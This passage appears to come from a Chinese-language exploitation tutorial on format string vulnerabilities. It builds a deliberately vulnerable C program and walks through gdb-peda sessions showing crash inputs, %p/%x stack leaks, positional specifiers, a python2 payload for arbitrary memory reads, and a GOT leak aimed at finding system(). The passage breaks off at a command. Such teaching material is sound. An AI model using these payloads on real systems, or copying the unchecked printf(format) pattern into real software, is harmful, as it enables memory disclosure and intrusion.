\u51fd\u6570\u4ece\u6808\u4e2d\u53d6\u51fa\u53c2\u6570\uff0c\u5982\u679c\u5b83\u9700\u8981 3 \u4e2a\uff0c\u90a3\u5b83\u5c31\u53d6\u51fa 3 \u4e2a\u3002\u9664\u975e\u6808\u7684\u8fb9\u754c\u88ab\u6807\u8bb0\u4e86\uff0c\u5426\u5219 printf() \u662f\u4e0d\u4f1a\u77e5\u9053\u5b83\u53d6\u51fa\u7684\u53c2\u6570\u6bd4\u63d0\u4f9b\u7ed9\u5b83\u7684\u53c2\u6570\u591a\u4e86\u3002\u7136\u800c\u5e76\u6ca1\u6709\u8fd9\u6837\u7684\u6807\u8bb0\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 \u901a\u8fc7\u63d0\u4f9b\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u63a7\u5236\u683c\u5f0f\u5316\u51fd\u6570\u7684\u884c\u4e3a\u3002\u6f0f\u6d1e\u7684\u5229\u7528\u4e3b\u8981\u6709\u4e0b\u9762\u51e0\u79cd\u3002 \u4f7f\u7a0b\u5e8f\u5d29\u6e83 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u901a\u5e38\u8981\u5728\u7a0b\u5e8f\u5d29\u6e83\u65f6\u624d\u4f1a\u88ab\u53d1\u73b0\uff0c\u6240\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u8fdb\u7a0b\u5d29\u6e83\u3002\u5728 Linux \u4e2d\uff0c\u5b58\u53d6\u65e0\u6548\u7684\u6307\u9488\u4f1a\u5f15\u8d77\u8fdb\u7a0b\u6536\u5230 SIGSEGV \u4fe1\u53f7\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u975e\u6b63\u5e38\u7ec8\u6b62\u5e76\u4ea7\u751f\u6838\u5fc3\u8f6c\u50a8\uff08\u5728 Linux \u57fa\u7840\u7684\u7ae0\u8282\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u6838\u5fc3\u8f6c\u50a8\uff09\u3002\u6211\u4eec\u77e5\u9053\u6838\u5fc3\u8f6c\u50a8\u4e2d\u5b58\u50a8\u4e86\u7a0b\u5e8f\u5d29\u6e83\u65f6\u7684\u8bb8\u591a\u91cd\u8981\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u6b63\u662f\u653b\u51fb\u8005\u6240\u9700\u8981\u7684\u3002 \u5229\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\uff1a printf(\"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\") \u5bf9\u4e8e\u6bcf\u4e00\u4e2a %s \uff0c printf() \u90fd\u8981\u4ece\u6808\u4e2d\u83b7\u53d6\u4e00\u4e2a\u6570\u5b57\uff0c\u628a\u8be5\u6570\u5b57\u89c6\u4e3a\u4e00\u4e2a\u5730\u5740\uff0c\u7136\u540e\u6253\u5370\u51fa\u5730\u5740\u6307\u5411\u7684\u5185\u5b58\u5185\u5bb9\uff0c\u76f4\u5230\u51fa\u73b0\u4e00\u4e2a NULL \u5b57\u7b26\u3002 \u56e0\u4e3a\u4e0d\u53ef\u80fd\u83b7\u53d6\u7684\u6bcf\u4e00\u4e2a\u6570\u5b57\u90fd\u662f\u5730\u5740\uff0c\u6570\u5b57\u6240\u5bf9\u5e94\u7684\u5185\u5b58\u53ef\u80fd\u5e76\u4e0d\u5b58\u5728\u3002 \u8fd8\u6709\u53ef\u80fd\u83b7\u5f97\u7684\u6570\u5b57\u786e\u5b9e\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u4f46\u662f\u8be5\u5730\u5740\u662f\u88ab\u4fdd\u62a4\u7684\u3002 \u67e5\u770b\u6808\u5185\u5bb9 \u4f7f\u7a0b\u5e8f\u5d29\u6e83\u53ea\u662f\u9a8c\u8bc1\u6f0f\u6d1e\u7684\u7b2c\u4e00\u6b65\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u6765\u83b7\u5f97\u5185\u5b58\u7684\u5185\u5bb9\uff0c\u4e3a\u4e0b\u4e00\u6b65\u6f0f\u6d1e\u5229\u7528\u505a\u51c6\u5907\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e0a\u53d6\u503c\u3002\u7531\u4e8e\u5728 x86 \u4e0a\u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u800c printf() \u51fd\u6570\u7684\u53c2\u6570\u662f\u4ee5\u9006\u5e8f\u88ab\u538b\u5165\u6808\u7684\uff0c\u6240\u4ee5\u53c2\u6570\u5728\u5185\u5b58\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u4e0e\u5728 printf() \u8c03\u7528\u65f6\u51fa\u73b0\u7684\u987a\u5e8f\u662f\u4e00\u81f4\u7684\u3002 \u4e0b\u9762\u7684\u6f14\u793a\u6211\u4eec\u90fd\u4f7f\u7528\u4e0b\u9762\u7684 \u6e90\u7801 \uff1a #include<stdio.h> void main() { char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = \"ABCD\"; scanf(\"%s\", format); printf(format, arg1, arg2, arg3, arg4); printf(\"\\n\"); } # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -m32 -fno-stack-protector -no-pie fmt.c \u6211\u4eec\u5148\u8f93\u5165 b main \u8bbe\u7f6e\u65ad\u70b9\uff0c\u4f7f\u7528 n \u5f80\u4e0b\u6267\u884c\uff0c\u5728 call 0x56555460 <__isoc99_scanf@plt> \u5904\u8f93\u5165 %08x.%08x.%08x.%08x.%08x \uff0c\u7136\u540e\u4f7f\u7528 c \u7ee7\u7eed\u6267\u884c\uff0c\u5373\u53ef\u8f93\u51fa\u7ed3\u679c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ x/10x $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 gdb-peda$ c Continuing. 00000001.88888888.ffffffff.ffffd57a.ffffd584 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 0xffffd584 \u7684\u5730\u5740\u51fa\u73b0\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u6070\u597d\u4f4d\u4e8e\u53c2\u6570 arg1 \u3001 arg2 \u3001 arg3 \u3001 arg4 \u4e4b\u524d\u3002\u683c\u5f0f\u5b57\u7b26\u4e32 %08x.%08x.%08x.%08x.%08x \u8868\u793a\u51fd\u6570 printf() \u4ece\u6808\u4e2d\u53d6\u51fa 5 \u4e2a\u53c2\u6570\u5e76\u5c06\u5b83\u4eec\u4ee5 8 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\u7684\u5f62\u5f0f\u663e\u793a\u51fa\u6765\u3002\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u4f7f\u7528\u4e00\u4e2a\u5185\u90e8\u53d8\u91cf\u6765\u6807\u5fd7\u4e0b\u4e00\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002\u5f00\u59cb\u65f6\uff0c\u53c2\u6570\u6307\u9488\u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08 arg1 \uff09\u3002\u968f\u7740\u6bcf\u4e00\u4e2a\u53c2\u6570\u88ab\u76f8\u5e94\u7684\u683c\u5f0f\u89c4\u8303\u6240\u8017\u7528\uff0c\u53c2\u6570\u6307\u9488\u7684\u503c\u4e5f\u6839\u636e\u53c2\u6570\u7684\u957f\u5ea6\u4e0d\u65ad\u9012\u589e\u3002\u5728\u663e\u793a\u5b8c\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u5269\u4f59\u81ea\u52a8\u53d8\u91cf\u4e4b\u540e\uff0c printf() \u5c06\u663e\u793a\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u6808\u5e27\uff08\u5305\u62ec\u8fd4\u56de\u5730\u5740\u548c\u53c2\u6570\u7b49\uff09\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 %p.%p.%p.%p.%p \u5f97\u5230\u76f8\u4f3c\u7684\u7ed3\u679c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%p.%p.%p.%p.%p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%p.%p.%p.%p.%p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ c Continuing. 0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584 \u4e0a\u9762\u7684\u65b9\u6cd5\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u53c2\u6570\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u76f4\u63a5\u83b7\u5f97\u88ab\u6307\u5b9a\u7684\u67d0\u4e2a\u53c2\u6570\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\uff1a %<arg#>$<format> %n$x \u8fd9\u91cc\u7684 n \u8868\u793a\u6808\u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u540e\u9762\u7684\u7b2c n \u4e2a\u503c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ x/10w $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 gdb-peda$ c Continuing. ffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x56555220 \u8fd9\u91cc\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e3a 0xffffd584 \u3002\u6211\u4eec\u901a\u8fc7\u683c\u5f0f\u5b57\u7b26\u4e32 %3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p \u5206\u522b\u83b7\u53d6\u4e86 arg3 \u3001 arg1 \u3001\u4e24\u4e2a arg2 \u3001 arg4 \u548c\u6808\u4e0a\u7d27\u8ddf\u53c2\u6570\u7684\u4e24\u4e2a\u503c\u3002\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u65b9\u6cd5\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u83b7\u5f97\u6808\u4e2d\u4efb\u610f\u7684\u503c\u3002 \u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u201c\u663e\u793a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u201d\u7684\u683c\u5f0f\u89c4\u8303\u6765\u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 %s \u663e\u793a\u53c2\u6570\u3000\u6307\u9488\u6240\u6307\u5b9a\u7684\u5730\u5740\u7684\u5185\u5b58\uff0c\u5c06\u5b83\u4f5c\u4e3a\u4e00\u4e2a ASCII \u5b57\u7b26\u4e32\u5904\u7406\uff0c\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u64cd\u7eb5\u8fd9\u4e2a\u53c2\u6570\u6307\u9488\u6307\u5411\u4e00\u4e2a\u7279\u5b9a\u7684\u5730\u5740\uff0c\u90a3\u4e48 %s \u5c31\u4f1a\u8f93\u51fa\u8be5\u4f4d\u7f6e\u7684\u5185\u5b58\u5185\u5bb9\u3002 \u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u8f93\u5165 %4$s \uff0c\u8f93\u51fa\u7684 arg4 \u5c31\u53d8\u6210\u4e86 ABCD \u800c\u4e0d\u662f\u5730\u5740 0xffffd57a \uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%4$s\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%4$s\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%4$s\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%4$s\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%4$s\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ c Continuing. ABCD \u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bfb\u53d6\u6808\u4e2d\u5df2\u6709\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6211\u4eec\u60f3\u83b7\u53d6\u7684\u662f\u4efb\u610f\u7684\u5730\u5740\u7684\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u6211\u4eec\u81ea\u5df1\u5c06\u5730\u5740\u5199\u5165\u5230\u6808\u4e2d\u3002\u6211\u4eec\u8f93\u5165 AAAA.%p \u8fd9\u6837\u7684\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u4e00\u4e0b\u6808\u6709\u4ec0\u4e48\u53d8\u5316\u3002 gdb-peda$ python print(\"AAAA\"+\".%p\"*20) AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p ... gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () \u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5728 0xffffd584 \uff0c\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\u5b83\u4eec\u5728\u6808\u4e2d\u662f\u600e\u6837\u6392\u5e03\u7684\uff1a gdb-peda$ x/20w $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd580: 0x00000000 0x41414141 0x2e70252e 0x252e7025 0xffffd590: 0x70252e70 0x2e70252e 0x252e7025 0x70252e70 gdb-peda$ x/20wb 0xffffd584 0xffffd584: 0x41 0x41 0x41 0x41 0x2e 0x25 0x70 0x2e 0xffffd58c: 0x25 0x70 0x2e 0x25 0x70 0x2e 0x25 0x70 0xffffd594: 0x2e 0x25 0x70 0x2e gdb-peda$ python print('\\x2e\\x25\\x70') .%p \u4e0b\u9762\u662f\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\uff1a gdb-peda$ c Continuing. AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e 0x41414141 \u662f\u8f93\u51fa\u7684\u7b2c 13 \u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u6211\u4eec\u4f7f\u7528 %13$s \u5373\u53ef\u8bfb\u51fa 0x41414141 \u5904\u7684\u5185\u5bb9\uff0c\u5f53\u7136\uff0c\u8fd9\u91cc\u53ef\u80fd\u662f\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u5730\u5740\u3002\u4e0b\u9762\u6211\u4eec\u628a 0x41414141 \u6362\u6210\u6211\u4eec\u9700\u8981\u7684\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32 ABCD \u7684\u5730\u5740 0xffffd57a \uff1a $ python2 -c 'print(\"\\x7a\\xd5\\xff\\xff\"+\".%13$s\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd584 --> 0xffffd57a (\"ABCD\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd550 --> 0xffffd584 --> 0xffffd57a (\"ABCD\") 0008| 0xffffd554 --> 0x1 0012| 0xffffd558 --> 0x88888888 0016| 0xffffd55c --> 0xffffffff 0020| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0024| 0xffffd564 --> 0xffffd584 --> 0xffffd57a (\"ABCD\") 0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20w $esp 0xffffd54c: 0x08048520 0xffffd584 0x00000001 0x88888888 0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584 0x080481fc 0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd57c: 0x00004443 0x00000000 0xffffd57a 0x3331252e 0xffffd58c: 0x00007324 0xffffd5ca 0x00000001 0x000000c2 gdb-peda$ x/s 0xffffd57a 0xffffd57a: \"ABCD\" gdb-peda$ c Continuing. z\ufffd\ufffd\ufffd.ABCD \u5f53\u7136\u8fd9\u4e5f\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u771f\u6b63\u7ecf\u5e38\u7528\u5230\u7684\u5730\u65b9\u662f\uff0c\u628a\u7a0b\u5e8f\u4e2d\u67d0\u51fd\u6570\u7684 GOT \u5730\u5740\u4f20\u8fdb\u53bb\uff0c\u7136\u540e\u83b7\u5f97\u8be5\u5730\u5740\u6240\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\u3002\u7136\u540e\u6839\u636e\u51fd\u6570\u5728 libc \u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u8ba1\u7b97\u51fa\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570\u5730\u5740\uff08\u5982 system() \uff09\u3002\u5982\u4e0b\u9762\u5c55\u793a\u7684\u8fd9\u6837\uff1a \u5148\u770b\u4e00\u4e0b\u91cd\u5b9a\u5411\u8868\uff1a $ readelf -r a.out Relocation section '.rel.dyn' at offset 0x2e8 contains 1 entries: Offset Info Type Sym.Value Sym. Name 08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__ Relocation section '.rel.plt' at offset 0x2f0 contains 4 entries: Offset Info Type Sym.Value Sym. Name 0804a00c 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a014 00000407 R_386_JUMP_SLOT 00000000 putchar@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 .rel.plt \u4e2d\u6709\u56db\u4e2a\u51fd\u6570\u53ef\u4f9b\u6211\u4eec\u9009\u62e9\uff0c\u6309\u7406\u8bf4\u9009\u62e9\u4efb\u610f\u4e00\u4e2a\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u6211\u4eec\u4f1a\u53d1\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\u4e0b\u9762\u7684\u7ed3\u679c\u5206\u522b\u662f printf \u3001 __libc_start_main \u3001 putchar \u548c __isoc99_scanf \uff1a $ python2 -c 'print(\"\\x0c\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out 